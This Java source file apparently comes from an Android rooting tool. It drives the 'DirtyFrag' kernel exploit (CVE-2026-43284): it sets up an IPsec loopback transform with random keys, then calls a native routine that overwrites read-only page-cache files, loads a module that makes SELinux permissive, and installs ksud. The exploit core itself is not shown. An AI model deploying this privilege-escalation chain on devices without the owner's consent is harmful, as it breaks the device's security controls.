package df.root;

import android.content.Context;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import android.util.Log;

import java.io.File;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.security.SecureRandom;

/**
 * 快通道：DirtyFrag（CVE-2026-43284），上游 diabl0w/DFRoot 那条链路。
 *
 * 它比 CVE-2026-43499 那条快得多（几秒到几十秒），所以在自动模式里排第一步。
 * 代价是它用的是另一条内核原语：改写 page cache 上几个只读文件、加载一个把 SELinux
 * 设为 permissive 的内核模块，并在 /dev/df 留下"本轮已布防"的痕迹。
 *
 * 因此它失败之后要分两种情况：
 *
 *   FAILED_CLEAN —— 没有留下布防痕迹，可以安全地接着跑 CVE-2026-43499 那条链路；
 *   FAILED_ARMED —— 已经布防（/dev/df 存在）但没走完。两条链路都在内核里动手，
 *                   这时不能再叠加第二个漏洞，只能重启手机重来。
 */
final class FastChain {

    private static final String TAG = "dfroot";

    enum Result {
        SUCCESS,
        FAILED_CLEAN,
        FAILED_ARMED,
    }

    private FastChain() {}

    static Result run(Context context, Sink sink) {
        try {
            if (!DeviceCheck.preflight("快通道 DirtyFrag")) {
                sink.log("\n自检未通过：依赖路径缺失 —— 没有修改任何文件，已中止。\n");
                return Result.FAILED_CLEAN;
            }

            IpSecManager ipsec = (IpSecManager) context.getSystemService(Context.IPSEC_SERVICE);
            IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
            int encapPort = encapSock.getPort();
            sink.log("IPSec 封装端口: " + encapPort + "\n");

            InetAddress loopback = InetAddress.getByName("127.0.0.1");
            IpSecManager.SecurityParameterIndex spiObj =
                    ipsec.allocateSecurityParameterIndex(loopback);
            int spiVal = spiObj.getSpi();
            sink.log("SPI: 0x" + Integer.toHexString(spiVal) + "\n");

            SecureRandom rng = new SecureRandom();
            byte[] aesKey = new byte[32];
            rng.nextBytes(aesKey);
            byte[] hmacKey = new byte[32];
            rng.nextBytes(hmacKey);

            IpSecAlgorithm enc = new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey);
            IpSecAlgorithm auth = new IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128);

            DatagramSocket senderSock = new DatagramSocket();
            int senderPort = senderSock.getLocalPort();
            senderSock.close();

            IpSecTransform transform = new IpSecTransform.Builder(context)
                    .setEncryption(enc)
                    .setAuthentication(auth)
                    .setIpv4Encapsulation(encapSock, senderPort)
                    .buildTransportModeTransform(loopback, spiObj);

            File ksud = KsudChannel.binary(context);
            if (!ksud.isFile()) {
                sink.log("\n自检未通过：找不到 " + ksud.getAbsolutePath() + " —— 已中止。\n");
                return Result.FAILED_CLEAN;
            }
            sink.log("ksud: " + ksud.getAbsolutePath() + "\n");
            sink.log("开始执行漏洞利用（快通道，通常几秒到几十秒）……\n");

            int icvLen = 128 / 8;
            // 最后一个参数是 skipSoftReboot：true = 不给 ksud 传 --soft-reboot。
            // v1.8 起固定传 true：带 --soft-reboot 时 ksud 装完会重启一次系统框架，
            // 用户看到的就是「开机之后又自己重启了一次」；更糟的是这次重启会把应用进程
            // 连同它正在跑的「安装界面广告设置」一起打断 —— 那两条命令就是这么丢的。
            int rc = MainActivity.nativeRunAll(sink, encapPort, spiVal, aesKey, hmacKey, icvLen,
                    senderPort, ksud.getAbsolutePath(), true);

            transform.close();
            spiObj.close();
            encapSock.close();

            Log.i(TAG, "快通道 rc=" + rc);
            if (rc == 0) {
                // 快通道也是「本轮已经装好了」，记一笔凭据：否则界面上会一直停在
                // 「本轮已布防（/dev/df 存在）」，看着像失败；下一次开机广播也会因为没有
                // 凭据而重复跑一遍。
                RmgChain.storeFastReceipt(context);
                // 拿到 root 之后顺手把三星安装器的广告设置做掉（后台跑，不拖慢这里）。
                PostRoot.applyAsync(context, sink);
                return Result.SUCCESS;
            }
            return new File("/dev/df").exists() ? Result.FAILED_ARMED : Result.FAILED_CLEAN;
        } catch (Exception e) {
            Log.e(TAG, "快通道异常", e);
            sink.log("\n快通道发生异常: " + e + "\n");
            return new File("/dev/df").exists() ? Result.FAILED_ARMED : Result.FAILED_CLEAN;
        }
    }
}
